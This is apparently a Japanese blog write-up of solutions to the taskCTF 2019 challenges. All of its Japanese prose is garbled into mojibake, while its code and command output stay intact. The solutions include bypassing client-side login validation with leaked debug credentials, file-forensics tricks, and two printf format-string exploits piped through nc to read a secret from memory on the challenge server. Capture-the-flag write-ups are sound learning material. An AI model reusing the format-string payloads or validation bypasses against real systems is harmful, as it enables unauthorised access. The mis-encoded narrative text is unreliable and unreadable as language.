---
layout: post
title: taskCTF ã® write-up
categories: [ctf]
date: 2019-12-06 01:00:00 +0900
---

ã²ã¨ã‚Šãƒãƒ¼ãƒ  st98 ã§ [taskCTF](https://taskctf.cf/) ã«å‚åŠ ã—ã¾ã—ãŸã€‚æœ€çµ‚çš„ã«å…¨å•ã‚’è§£ã„ã¦ 1300 ç‚¹ã‚’ç²å¾—ã—ã€2 ä½ã§ã—ãŸã€‚

ä»¥ä¸‹ã€è§£ã„ãŸå•é¡Œã® write-up ã§ã™ã€‚

## [Welcome 100] Welcome
> Welcome to taskCTF!
> flag: taskctf{let's_enj0y!}

```
taskctf{let's_enj0y!}
```

## [Web 100] Bad Frontend-1
> ç§ãƒ•ãƒ­ãƒ³ãƒˆã‚¨ãƒ³ãƒ‰ã‚¨ãƒ³ã‚¸ãƒ‹ã‚¢ï¼
> é ¼ã¾ã‚Œã¦ã„ãŸValidationä»˜ãã®ãƒ­ã‚°ã‚¤ãƒ³ç”»é¢ã‚’ä½œã£ãŸã‚ˆã€‚
> å…ˆè¼©, è¤’ã‚ã¦ãã‚Œã‚‹ã‹ãªï¼Ÿ
> 
> (URL)

ä¸ãˆã‚‰ã‚ŒãŸ URL ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã¨ãƒ­ã‚°ã‚¤ãƒ³ãƒ•ã‚©ãƒ¼ãƒ ãŒè¡¨ç¤ºã•ã‚Œã¾ã—ãŸã€‚HTML ã‚’è¦‹ã¦ã¿ã‚‹ã¨ã€ä»¥ä¸‹ã®ã‚ˆã†ãªã‚³ãƒ¡ãƒ³ãƒˆãŒç¢ºèªã§ãã¾ã—ãŸã€‚

```html
          <!--
              note for debug
              username: superuser_admin
              password: password12345678
            -->
```

æ—©é€Ÿãƒ­ã‚°ã‚¤ãƒ³ãƒ•ã‚©ãƒ¼ãƒ ã«ã‚³ãƒ”ãƒšã—ã¦ã¿ã¾ã—ãŸãŒã€8 æ–‡å­—ã—ã‹å…¥åŠ›ã§ãã¾ã›ã‚“ã€‚HTML ã‚’ã‚ˆãè¦‹ã‚‹ã¨ `input` è¦ç´ ã« `maxlength="8"` ãŒè¨­å®šã•ã‚Œã¦ã„ã¾ã™ã€‚ã“ã‚Œã‚’ DevTools ã§å‰Šé™¤ã—ã¦å…ˆç¨‹ã®èªè¨¼æƒ…å ±ã§ãƒ­ã‚°ã‚¤ãƒ³ã™ã‚‹ã¨ãƒ•ãƒ©ã‚°ãŒå¾—ã‚‰ã‚Œã¾ã—ãŸã€‚

```
taskctf{maxlength_15_4_5t0pg4p_s0lut10n}
```

## [Web 100] Bad-Frontend-2
> å…ˆè¼©ã«æŒ‡æ‘˜ã•ã‚ŒãŸã®ã§, JavaScriptã§ã‚‚Validationã‚’è¿½åŠ ã—ã¦ã¿ãŸã‚ˆã€‚
> ã“ã‚Œã§ã‚‚ã†å¤§ä¸ˆå¤«ã‹ãªï¼Ÿ
> 
> (URL)

Bad Frontend-1 ã¨ã»ã¨ã‚“ã©åŒã˜å†…å®¹ã®ã‚ˆã†ã§ã™ãŒã€ä»¥ä¸‹ã®ã‚ˆã†ãªå†…å®¹ã® `validation.js` ãŒèª­ã¿è¾¼ã¾ã‚Œã‚‹ã‚ˆã†å¤‰æ›´ã•ã‚Œã¦ã„ã¾ã—ãŸã€‚

```javascript
const username = document.getElementById("username");
const password = document.getElementById("password");

username.addEventListener('input', function (e) {
    const value = e.target.value;
    e.target.value = value.slice(0, 8);
})

password.addEventListener('input', function (e) {
    const value = e.target.value;
    e.target.value = value.slice(0, 8);
})
```

å…ˆç¨‹ã¨åŒæ§˜ `input` è¦ç´ ã® `maxlength="8"` ã‚’å‰Šé™¤ã—ãŸä¸Šã§ `username.value = 'superuser_admin'; password.value = 'password12345678';` ã‚’å®Ÿè¡Œã—ã¦ã‚¤ãƒ™ãƒ³ãƒˆã‚’ç™ºç«ã•ã›ã‚‹ã“ã¨ãªããƒ•ã‚©ãƒ¼ãƒ ã®å†…å®¹ã‚’å¤‰æ›´ã—ã€ãƒ­ã‚°ã‚¤ãƒ³ã™ã‚‹ã¨ãƒ•ãƒ©ã‚°ãŒå¾—ã‚‰ã‚Œã¾ã—ãŸã€‚

```
taskctf{Fr0ntend_v4lid4t10n_15_5t1ll_we4k}
```

## [Misc 100] Rainforest
> Capture the flag in the rainforest!

Rainforest ã¨ã„ãˆã° Amazon ã§ã™ã€‚CTF ã®ãƒˆãƒƒãƒ—ãƒšãƒ¼ã‚¸ã«ã‚ã‚‹ Amazon ã®æ¬²ã—ã„ç‰©ãƒªã‚¹ãƒˆã‚’è¦‹ã¦ã„ãã¨ã€ã¨ã‚ã‚‹å•†å“ã®ã‚³ãƒ¡ãƒ³ãƒˆã«ãƒ•ãƒ©ã‚°ãŒè¨­å®šã•ã‚Œã¦ã„ã¾ã—ãŸã€‚

```
taskctf{Y0u_c4nn0t_5ee_the_f0re5t_f0r_the_tree5}
```

## [Misc 100] Matryoshka
> zipãƒ•ã‚¡ã‚¤ãƒ«ãŒé€ã‚‰ã‚Œã¦ããŸã‘ã©, ãªãœã‹é–‹ã‘ãªã„ã§ã™......
å°‘ã—èª¿ã¹ã¦ã¿ã¦ãã‚Œãªã„ï¼Ÿ
> 
> æ·»ä»˜ãƒ•ã‚¡ã‚¤ãƒ«: flag.zip

`unzip` ã‚³ãƒãƒ³ãƒ‰ã«æŠ•ã’ã¦ã¿ã¾ã—ãŸãŒã€`End-of-central-directory signature not found.  Either this file is not a zipfile, â€¦` ã¨æ€’ã‚‰ã‚Œã¦ã—ã¾ã„ã¾ã—ãŸã€‚`file` ã‚³ãƒãƒ³ãƒ‰ã§ã©ã®ã‚ˆã†ãªãƒ•ã‚¡ã‚¤ãƒ«ã‹ç¢ºèªã—ã¾ã—ã‚‡ã†ã€‚

```
$ file flag.zip
flag.zip: cpio archive
```

cpio ã˜ã‚ƒãªã„ã§ã™ã‹! 7-Zip ã§é–‹ã„ã¦å±•é–‹ã—ã¦ã¿ã‚‹ã¨ `flag.tar.gz` ã¨ã„ã†ãƒ•ã‚¡ã‚¤ãƒ«ãŒå‡ºã¦ãã¾ã—ãŸã€‚ã“ã‚Œã‚‚ `file` ã‚³ãƒãƒ³ãƒ‰ã«é€šã™ã¨ bzip2 ã§ã‚ã‚‹ã“ã¨ãŒã‚ã‹ã‚Šã¾ã™ã€‚æ‹¡å¼µå­ã‚’ä¿¡ç”¨ã›ãš 7-Zip ã§å±•é–‹ã—ç¶šã‘ã‚‹ã¨ã€æœ€çµ‚çš„ã« `flag` ã¨ `whatAmI` ã¨ã„ã†ãƒ•ã‚¡ã‚¤ãƒ«ãŒå‡ºã¦ãã¾ã—ãŸã€‚å‰è€…ãŒãƒ•ãƒ©ã‚°ã§ã—ãŸã€‚

```
taskctf{m1nd_the_f1le_extent10n}
```

## [Misc 100] Matryoshka-2
> ãŠã‹ã’ã•ã¾ã§é–‹ã‘ãŸã‘ã©, æ¬¡ã¯æ€ªæ–‡æ›¸ã§ã™ã‹......
> è¿½åŠ èª¿æŸ»ãŠã­ãŒã„ã—ã¾ã™ã€‚
> 
> [2019-12-05 01:15:00 JSTè¿½è¨˜] Matryoshkaã§è§£ã„ãŸéš›ã«, flagä»¥å¤–ã«ã‚‚ã†ä¸€ã¤ãƒ•ã‚¡ã‚¤ãƒ«ãŒã‚ã£ãŸã¨æ€ã„ã¾ã™ã€‚ãã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚’è¿½åŠ ã§èª¿æŸ»ã—ã¦ãã ã•ã„ï¼

Matryoshka ã®ç¶šãã®ã‚ˆã†ã§ã™ã€‚`whatAmI` ã¯ä»¥ä¸‹ã®ã‚ˆã†ãªå†…å®¹ã§ã—ãŸã€‚

```
N3q8ryccAAShfltxJQIAAAAAAAAhAAAAAAAAANCfkrrgAewBsV0ALGiBABn6B/yQVSAphFxUm968
7FM/eBKHsAAl3tYLd6ikKF8eCxfBpakkNinQtBUJ08Ne8VXEbXadlBDf2kjHQRmn9R4jtG5gEczh
2uyf6CbHkRb3fK5OVwYITpphK/tDcMG96Kn2xE+sfmAXAwQADS/6WNRgi+P/LBZbGgfI/18r1tz8
tmPC3h65sw7+ziewhNSqLZ0hh9VTxfKw52blwNkhVT64OMgyfSq6cr53GA0/iNVw/HazDnYlKKnZ
COaTPORRJQDKO1Ngs1mtR5ZSpcd6P6B9K3w6e5V5OSpx8W27mVGKw7MVctmTL1CUa5gtaHsMm0V7
t04qFD5cR8wJO6a4LTkoMeIDnN52MAzwOQLCqoPVkIi4FlyvWe+WNMyVvN4wgALSpeggZY44sppe
2pEa7t8uTWmkx3EWyXuqC3WtL2zaaxWckVczSW9a+oTHVqXW2OGvtGpo8ytmoMWrWnz54qoD9kf/
jfwaBYLuYpVKPvvpRKsrfrWfxojmSN5RINVyM2kv8ev26oTwDQac9DZvc28+gBkazMHweLC8ieSI
Cbd4INBZQcSx7Ufcj4WH9wAAAIEzB64P1TvrS1ck0/6zcBiBQB5HXlta8CpiDsFj1Rfbm6jy08no
4qzQYkZBoykapbsEeZuYGbzrg0V4DEFTOdBZ2W3lrFuJAwEOgXkMP6BB76KehvYW2CJ7JpNBGeFG
ioKdzTmGk7MAAAAXBoG5AQlsAAcLAQABIwMBAQVdABAAAAxuCgHMJMICAAAA
```

æ˜ã‚‰ã‹ã« Base64 ã§ã™ã€‚`base64 -d whatAmI` ã§ãƒ‡ã‚³ãƒ¼ãƒ‰ã—ã€å…ˆç¨‹ã¨åŒæ§˜ã« 7-Zip ã§å±•é–‹ã™ã‚‹ã¨ `broken` ã¨ `flag` ã¨ã„ã†ãƒ•ã‚¡ã‚¤ãƒ«ãŒå‡ºã¦ãã¾ã—ãŸã€‚å¾Œè€…ãŒãƒ•ãƒ©ã‚°ã§ã—ãŸã€‚

```
taskctf{Base64_enc0de5_w1th_64_ch4r4cter5}
```

## [Misc 100] Matryoshka-3
> ãˆï¼Ÿä¸­ã«ã¾ã ãƒ•ã‚¡ã‚¤ãƒ«ãŒã‚ã£ãŸã®ï¼Ÿ
> ä½•åº¦ã‚‚æ‚ªã„ã‚“ã ã‘ã©, ãã‚Œã®èª¿æŸ»ã‚‚ãŠé¡˜ã„ã§ãã¾ã™ï¼Ÿ

Matryoshka ã®ç¶šãã®ã‚ˆã†ã§ã™ã€‚`broken` ã¯ä»¥ä¸‹ã®ã‚ˆã†ãªå†…å®¹ã§ã—ãŸã€‚

```
$ xxd broken
0000000: 5858 5858 1400 0000 0800 d393 844f 42e3  XXXX.........OB.
0000010: 0746 1f01 0000 5c01 0000 0400 1c00 666c  .F....\.......fl
0000020: 6167 5554 0900 03bd 7ce7 5d59 7be7 5d75  agUT....|.]Y{.]u
0000030: 780b 0001 0400 0000 0004 0000 0000 4d90  x.............M.
0000040: bf4a 0431 1087 fb7d 8ab1 b239 b227 1c1e  .J.1...}...9.'..
0000050: 770f 2008 16b6 5e23 d9ec ec25 9a4d 4232  w. ...^#...%.MB2
0000060: ebb1 8ac5 de16 5636 8288 3622 8a27 586a  ......V6..6".'Xj
0000070: efc3 04d1 c730 8716 361f 0cf3 e7f7 3195  .....0..6.....1.
0000080: e6f3 2910 0fc7 82aa b39d 2d33 d2ba 3dac  ..).......-3..=.
0000090: 9136 ceb3 6cb6 bb3f 8085 5442 820a c00d  .6..l..?..TB....
00000a0: 702f a43a 41a8 944e b0be e604 2413 42e3  p/.:A..N....$.B.
00000b0: 9cf5 1440 db90 8009 2527 0ec2 d6ce a74a  ...@....%'.....J
00000c0: 5933 00c9 0378 7498 1a45 daa7 85fd 3d24  Y3...xt..E....=$
00000d0: 9197 e803 cb0e 6c03 41da 4697 602c 2991  ......l.A.F.`,).
00000e0: 6664 0afe 9f96 9492 111a 68d7 b388 5028  fd........h...P(
00000f0: c37d cbd6 ae20 9262 634e 9583 a24d 69a6  .}... .bcN...Mi.
0000100: 64b0 87b4 1980 7c0b 8a36 328f d514 66ca  d.....|..62...f.
0000110: c5fe 3a2e 1fe2 f229 f6af 7179 f5f5 7e1b  ..:....)..qy..~.
0000120: bb97 d8df c5fe 2d76 abef d5e3 e7c5 65ec  ......-v......e.
0000130: 6e62 f71c bb8f d8dd 6792 c885 699e 130a  nb......g...i...
0000140: 5968 3b67 9e0b 61ad 6106 d991 cbff fe12  Yh;g..a.a.......
0000150: f2d1 78b2 3d1e 0e27 4c52 ad7f 0050 4b01  ..x.=..'LR...PK.
0000160: 021e 0314 0000 0008 00d3 9384 4f42 e307  ............OB..
0000170: 461f 0100 005c 0100 0004 0018 0000 0000  F....\..........
0000180: 0001 0000 00a4 8100 0000 0066 6c61 6755  ...........flagU
0000190: 5405 0003 bd7c e75d 7578 0b00 0104 0000  T....|.]ux......
00001a0: 0000 0400 0000 0058 5858 5800 0000 0001  .......XXXX.....
00001b0: 0001 004a 0000 005d 0100 0000 00         ...J...].....
```

`50 4b 01 02` ã¨ ZIP ã® Central Directory Header ã®ã‚·ã‚°ãƒãƒãƒ£ãŒè¦‹ãˆã¾ã™ã€‚`XXXX` ã‚’ `50 4b 03 04` ã«ç½®ãæ›ãˆã‚‹ã¨ ZIP ã¨ã—ã¦å±•é–‹ã§ãã€`flag` ã¨ã„ã†ãƒ•ã‚¡ã‚¤ãƒ«ã«ãƒ•ãƒ©ã‚°ãŒã‚ã‚Šã¾ã—ãŸã€‚

```
taskctf{F1n4lly_met!}
```

## [Misc 100] dataInPic
> ã“ã®ç”»åƒ, ã‚ˆãè¦‹ãŸã‚‰æ——ãŒã‚ã‚‹ã‚‰ã—ã„ã€‚
> å¤‰ã‚ã£ãŸã¨ã“ã‚ã¯ç„¡ã„ã‚ˆã†ã«æ€ã†ã‘ã©â€¦â€¦
> 
> æ·»ä»˜ãƒ•ã‚¡ã‚¤ãƒ«: new_icon.png

ã¨ã‚Šã‚ãˆãš `strings` ã«æŠ•ã’ã¦ã¿ã¾ã—ã‚‡ã†ã€‚

```
$ strings -n 10 new_icon.png
iTXt<x:xmpmeta xmlns:x="adobe:ns:meta/" x:xmptk="XMP Core 5.4.0">
   <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
      <rdf:Description rdf:about=""
            xmlns:exif="http://ns.adobe.com/exif/1.0/"
            xmlns:tiff="http://ns.adobe.com/tiff/1.0/">
         <exif:PixelYDimension>750</exif:PixelYDimension>
         <exif:PixelXDimension>750</exif:PixelXDimension>
         <exif:ColorSpace>1</exif:ColorSpace>
         <tiff:Orientation>1</tiff:Orientation>
      </rdf:Description>
   </rdf:RDF>
</x:xmpmeta>
|cc#rhS"G^
$dz9.ozpoz0&3
'7j# Uttkz
I5lvso?b48A
|Ew/D(%qs-
xUg06}~)*`
CZZ2Z^<eVL
'piKb~[?vW
q*L>ebMN{M
&z&B&L&R&Dvm^
Zi6xf7{>WL'
uX 7GM}8QS
W9XLYxsqcM
taskctf{p4y_4tten...can you get  the other?
2tEXtCopyright
...t10n_t0_ex1f}, can you get the other?
```

`taskctf{p4y_4tten...` ã¨ `...t10n_t0_ex1f}, can you get the other?` ã¨ã„ã†ãã‚Œã£ã½ã„ãƒ†ã‚­ã‚¹ãƒˆã‚’çµåˆã—ã¾ã—ã‚‡ã†ã€‚

```
taskctf{p4y_4ttent10n_t0_ex1f}
```

## [Misc 100] InvisibleFlag
> ã“ã®ãƒ•ã‚¡ã‚¤ãƒ«å†…ã«, åŸ‹ã‚è¾¼ã¾ã‚ŒãŸè¦‹ãˆãªã„FlagãŒã‚ã‚‹ã£ã¦å™‚ã‚’èã„ãŸã‚ˆã€‚
> ã§ã‚‚, ã„ãã‚‰æ¢ã—ã¦ã‚‚è¦‹ã¤ã‹ã‚‰ãªã„ã‚“ã ã€‚
> ä»£ã‚ã‚Šã«è¦‹ã¤ã‘ã¦ãã‚Œãªã„ï¼Ÿ
> 
> æ·»ä»˜ãƒ•ã‚¡ã‚¤ãƒ«: flag.txt

`flag.txt` ã¯ä»¥ä¸‹ã®ã‚ˆã†ãªå†…å®¹ã§ã—ãŸã€‚

```
$ xxd flag.txt
0000000: 69f3 a085 b66e f3a0 85a1 76f3 a085 ac61  i....n....v....a
0000010: f3a0 85a9 6cf3 a085 a469 f3a0 8586 64f3  ....l....i....d.
0000020: a085 ac46 f3a0 85a1 6cf3 a085 a761 f3a0  ...F....l....a..
0000030: 84ba 67f3 a085 b43a f3a0 85a1 74f3 a085  ..g....:....t...
0000040: b361 f3a0 85ab 73f3 a085 a36b f3a0 85b4  .a....s....k....
0000050: 63f3 a085 a674 f3a0 85bb 66f3 a085 847b  c....t....f....{
0000060: f3a0 84b1 54f3 a085 a468 f3a0 859f 31f3  ....T....h....1.
0000070: a085 b935 f3a0 84b0 5ff3 a085 b531 f3a0  ...5...._....1..
0000080: 859f 35f3 a085 ab5f f3a0 85ae 31f3 a084  ..5...._....1...
0000090: b06e f3a0 85b7 76f3 a085 9f34 f3a0 84b1  .n....v....4....
00000a0: 6cf3 a085 9631 f3a0 84b5 64f3 a084 bf5f  l....1....d...._
00000b0: f3a0 85bd 666c 3467 7d0a                 ....fl4g}.
```

ASCII ç¯„å›²å†…ã®æ–‡å­—ã‚’æŠœãå‡ºã™ã¨ `invalidFlag:taskctf{Th15_15_1nv4l1d_fl4g}` ã¨ã„ã†å½ãƒ•ãƒ©ã‚°ãŒå‡ºã¦ãã¾ã™ã€‚æ®‹ã£ãŸ ASCII ç¯„å›²å¤–ã®æ–‡å­—ã¯ `f3 a0 85 b6` ã‚„ `f3 a0 85 a1` ãªã© UTF-8 ã£ã½ã„é›°å›²æ°—ãŒã‚ã‚Šã¾ã™ã€‚UTF-8 ã¨ã—ã¦ãƒ‡ã‚³ãƒ¼ãƒ‰ã—ã¦å„æ–‡å­—ã®ã‚³ãƒ¼ãƒ‰ãƒã‚¤ãƒ³ãƒˆã‚’ç¢ºèªã—ã¦ã¿ã¾ã—ã‚‡ã†ã€‚

```
$ python3
>>> with open('flag.txt', 'rb') as f:
...   s = f.read().decode('utf-8')
...
>>> [hex(ord(x)) for x in s if ord(x) >= 0x7f]
['0xe0176', '0xe0161', '0xe016c', '0xe0169', '0xe0164', '0xe0146', '0xe016c', '0xe0161', '0xe0167', '0xe013a', '0xe0174', '0xe0161', '0xe0173', '0xe016b', '0xe0163', '0xe0174', '0xe0166', '0xe017b', '0xe0144', '0xe0131', '0xe0164', '0xe015f', '0xe0179', '0xe0130', '0xe0175', '0xe015f', '0xe016b', '0xe016e', '0xe0130', '0xe0177', '0xe015f', '0xe0131', '0xe0156', '0xe0135', '0xe013f', '0xe017d']
```

ã„ãšã‚Œã‚‚ `0xe01` ã‹ã‚‰å§‹ã¾ã£ã¦ã„ã¾ã™ã€‚ä¸‹ä½ 1 ãƒã‚¤ãƒˆãŒã„ãšã‚Œã‚‚ ASCII ç¯„å›²å†…ãªã®ã§æŠ½å‡ºã—ã¦ã¿ã¾ã—ã‚‡ã†ã€‚

```
>>> ''.join(chr(ord(x) & 0xff) for x in s if ord(x) >= 0x7f)
'validFlag:taskctf{D1d_y0u_kn0w_1V5?}'
```

ãƒ•ãƒ©ã‚°ãŒå¾—ã‚‰ã‚Œã¾ã—ãŸã€‚

```
taskctf{D1d_y0u_kn0w_1V5?}
```

## [Misc 100] hoardingHouse
> æœ€è¿‘å­¦æ ¡ã§åº¦èƒ¸è©¦ã—ã¨ã—ã¦ã‚´ãƒŸå±‹æ•·ã®æ¢æ¤œãŒæµè¡Œã£ã¦ã‚‹ã‚“ã ã‚ˆã­ã€‚
> å‹äººã‚‚ã“ã®å‰è¡Œã£ã¦ããŸã‚‰ã—ãã¦, ã‚´ãƒŸå±‹æ•·ã«ã‚ã‚‹ãƒãƒ¼ãƒˆã«flagã‚’æ›¸ã„ã¦ããŸã‚‰ã—ã„ã‚“ã ã€‚
> å½¼ã¯æ°—ãŒå¼·ã„ã‹ã‚‰ã§ããŸã‘ã©, ç§ã¯æ°—ãŒå¼±ã„ã‹ã‚‰è¦‹ã«è¡Œããªã‚“ã¦çµ¶å¯¾ã«ç„¡ç†ï¼
> ä»£ã‚ã‚Šã«flagã‚’è¦‹ã¤ã‘ã¦ãã¦ãã‚Œãªã„ï¼Ÿ
> 
> æ·»ä»˜ãƒ•ã‚¡ã‚¤ãƒ«: hoardingHouse.zip

`zipinfo` ã§ã©ã®ã‚ˆã†ãª ZIP ãƒ•ã‚¡ã‚¤ãƒ«ã‹ç¢ºèªã—ã¦ã¿ã¾ã—ã‚‡ã†ã€‚

```
$ zipinfo hoardingHouse.zip | head -n 30
Archive:  hoardingHouse.zip
Zip file size: 476824 bytes, number of entries: 1102
-rw-r--r--  3.0 unx       11 tx stor 19-Dec-05 01:33 note7.txt
-rw-r--r--  3.0 unx       11 tx stor 19-Dec-05 01:33 note6.txt
-rw-r--r--  3.0 unx       11 tx stor 19-Dec-05 01:33 note4.txt
-rw-r--r--  3.0 unx       11 tx stor 19-Dec-05 01:33 note5.txt
-rw-r--r--  3.0 unx     6148 bx defN 19-Dec-05 01:33 .DS_Store
-rw-r--r--  3.0 unx       11 tx stor 19-Dec-05 01:33 note1.txt
-rw-r--r--  3.0 unx       11 tx stor 19-Dec-05 01:33 note0.txt
-rw-r--r--  3.0 unx       11 tx stor 19-Dec-05 01:33 note2.txt
-rw-r--r--  3.0 unx       11 tx stor 19-Dec-05 01:33 note3.txt
drwxr-xr-x  3.0 unx        0 bx stor 19-Dec-05 01:33 0/
-rw-r--r--  3.0 unx       11 tx stor 19-Dec-05 01:33 0/note7.txt
-rw-r--r--  3.0 unx       11 tx stor 19-Dec-05 01:33 0/note6.txt
-rw-r--r--  3.0 unx       11 tx stor 19-Dec-05 01:33 0/note4.txt
-rw-r--r--  3.0 unx       11 tx stor 19-Dec-05 01:33 0/note5.txt
-rw-r--r--  3.0 unx       11 tx stor 19-Dec-05 01:33 0/note1.txt
-rw-r--r--  3.0 unx       11 tx stor 19-Dec-05 01:33 0/note0.txt
-rw-r--r--  3.0 unx       11 tx stor 19-Dec-05 01:33 0/note2.txt
-rw-r--r--  3.0 unx       11 tx stor 19-Dec-05 01:33 0/note3.txt
drwxr-xr-x  3.0 unx        0 bx stor 19-Dec-05 01:33 0/1/
-rw-r--r--  3.0 unx       11 tx stor 19-Dec-05 01:33 0/1/note7.txt
-rw-r--r--  3.0 unx       11 tx stor 19-Dec-05 01:33 0/1/note6.txt
-rw-r--r--  3.0 unx       11 tx stor 19-Dec-05 01:33 0/1/note4.txt
-rw-r--r--  3.0 unx       11 tx stor 19-Dec-05 01:33 0/1/note5.txt
-rw-r--r--  3.0 unx       11 tx stor 19-Dec-05 01:33 0/1/note1.txt
-rw-r--r--  3.0 unx       11 tx stor 19-Dec-05 01:33 0/1/note0.txt
-rw-r--r--  3.0 unx       11 tx stor 19-Dec-05 01:33 0/1/note2.txt
-rw-r--r--  3.0 unx       11 tx stor 19-Dec-05 01:33 0/1/note3.txt
-rw-r--r--  3.0 unx       11 tx stor 19-Dec-05 01:33 0/1/note8.txt
```

ãƒ†ã‚­ã‚¹ãƒˆãƒ•ã‚¡ã‚¤ãƒ«ãŒå¤§é‡ã«å…¥ã£ã¦ã„ã¾ã™ã€‚ã¨ã‚Šã‚ãˆãšå±•é–‹ã—ã¦ `taskctf` ã¨ã„ã†æ–‡å­—åˆ—ã‚’å«ã‚€ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ `grep` ã§æ¢ã—ã¦ã¿ã¾ã—ã‚‡ã†ã€‚

```
$ grep -r "taskctf" .
./0/1/2/3/4/5/6/7/8/9/10/11/12/13/14/15/16/17/18/19/20/21/22/23/24/25/26/27/28/29/30/31/32/33/34/35/36/37/38/39/40/41/42/43/44/45/46/47/48/49/50/51/52/53/54/55/56/note8.txt:taskctf{f1nd_4nd_grep_15_g0d}
```

ãƒ•ãƒ©ã‚°ãŒå¾—ã‚‰ã‚Œã¾ã—ãŸã€‚

```
taskctf{f1nd_4nd_grep_15_g0d}
```

## [Pwn 100] peep2
> (å•é¡Œã‚µãƒ¼ãƒã¸ã®æ¥ç¶šæƒ…å ±)
> 
> æ·»ä»˜ãƒ•ã‚¡ã‚¤ãƒ«: peep2.c

`peep2.c` ã¯ä»¥ä¸‹ã®ã‚ˆã†ãªå†…å®¹ã§ã—ãŸã€‚

```c
#include <stdio.h>

char s3cr37[64] = "taskctf{XXXXXXXX}\0";

void get_flag(){
  printf("flag is %s\n", s3cr37);
}

int main(){
  char local[128];
  fgets(local,128,stdin);
  printf(local);
  printf("secret address: 0x%x\n", &s3cr37);
  return 0;
}
```

æ¥ç¶šå¾Œã«é©å½“ãªæ–‡å­—åˆ—ã‚’å…¥åŠ›ã™ã‚‹ã¨ã€ãƒ•ãƒ©ã‚°ãŒã‚ã‚‹ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’æ•™ãˆã¦ãã‚Œã‚‹ã‚ˆã†ã§ã™ã€‚ã¨ã‚Šã‚ãˆãšå–å¾—ã—ã¦ã¿ã¾ã—ã‚‡ã†ã€‚

```
$ nc (çœç•¥)
a
a
secret address: 0x804a040
$ nc (çœç•¥)
b
b
secret address: 0x804a040
```

ä½•åº¦å®Ÿè¡Œã—ã¦ã‚‚ã“ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã¯å¤‰ã‚ã‚Šã¾ã›ã‚“ã€‚`printf(local);` ã¨ Format String Bug ãŒå­˜åœ¨ã—ã¦ã„ã‚‹ã®ã§ã€ã“ã‚Œã‚’åˆ©ç”¨ã—ã¦ãƒ•ãƒ©ã‚°ã‚’èª­ã¿å‡ºã—ã¦ã¿ã¾ã—ã‚‡ã†ã€‚

```
$ (echo -en '\x40\xa0\x04\x08%4$s'; echo neko) | nc (çœç•¥)
@taskctf{1t's_f0rm@_str1ng_4tt4ck!!}neko
secret address: 0x804a040
```

ãƒ•ãƒ©ã‚°ãŒå¾—ã‚‰ã‚Œã¾ã—ãŸã€‚

```
taskctf{1t's_f0rm@_str1ng_4tt4ck!!}
```

## [Pwn 100] 334.c
> (å•é¡Œã‚µãƒ¼ãƒã¸ã®æ¥ç¶šæƒ…å ±)
> 
> æ·»ä»˜ãƒ•ã‚¡ã‚¤ãƒ«: 334.c

`334.c` ã¯ä»¥ä¸‹ã®ã‚ˆã†ãªå†…å®¹ã§ã—ãŸã€‚

```c
#include <stdio.h>

char s3cr37[32] = "taskctf{XXXXXXXX}\0";
int key = 0x12345678;

void get_flag(){
  printf("flag is %s\n", s3cr37);
}

int main(){
  char local[128];
  fgets(local,128,stdin);
  printf(local);
  printf("key address: 0x%x\n", &key);
  printf("key        : 0x%x\n", key);
  if(key==0x334)
    get_flag();
  return 0;
}
```

ä»Šåº¦ã¯ `key` ã‚’ `0x334` ã«æ›¸ãæ›ãˆã‚Œã°ã‚ˆã„ã‚ˆã†ã§ã™ã€‚å…ˆç¨‹ã¨åŒã˜è¦é ˜ã§ `key` ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’å¾—ãŸå¾Œã€FSB ã‚’åˆ©ç”¨ã—ã¦æ›¸ãæ›ãˆã¡ã‚ƒã„ã¾ã—ã‚‡ã†ã€‚

```
$ nc (çœç•¥)
a
a
key address: 0x804a060
key        : 0x12345678
$ nc (çœç•¥)
b
b
key address: 0x804a060
key        : 0x12345678
$ (echo -en '\x40\xa0\x04\x08%4$s'; echo neko) | nc (çœç•¥)


@taskctf{wh@'2_334?}neko
key address: 0x804a060
key        : 0x12345678
```

ãƒ•ãƒ©ã‚°ãŒå¾—ã‚‰ã‚Œã¾ã—ãŸã€‚

```
taskctf{wh@'2_334?}
```

## [Misc 100] Questionnaire

ã‚¢ãƒ³ã‚±ãƒ¼ãƒˆã«ç­”ãˆã‚‹ã¨ãƒ•ãƒ©ã‚°ãŒå¾—ã‚‰ã‚Œã¾ã—ãŸã€‚CTF ã®çµ‚äº† 1 æ™‚é–“ã»ã©å‰ã«è¿½åŠ ã•ã‚ŒãŸå•é¡Œã§ã€ãã‚Œã¾ã§ç§ãŒ 1 ä½ã‚’ç¶­æŒã—ã¦ã„ã¾ã—ãŸãŒ [kusano ã•ã‚“](https://qiita.com/kusano_k/items/a768cece0a2737cc9be1#questionnaire)ã«å›ç­”é€Ÿåº¦ã§è² ã‘ã¾ã—ãŸğŸ˜‡

```
taskctf{Th4nk_y0u_f0r_pl4y1ng!}
```

---

ã‚ˆãè€ƒãˆã‚Œã°ã€Google ãƒ•ã‚©ãƒ¼ãƒ ã¯ HTML ã‚’è¦‹ã‚Œã°å›ç­”ã›ãšã¨ã‚‚çµ‚äº†å¾Œã®ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ãŒå¾—ã‚‰ã‚Œã¾ã™ã­ã€‚

```
ï¸™
]
]
]
,["taskctf{Th4nk_y0u_f0r_pl4y1ng!}",1,0,0,0]
,null,null,[0,0]
,null,null,"taskCTF Questionnaire",48,[null,null,null,null,0]
,null,null,null,null,[2]
ï¸™
```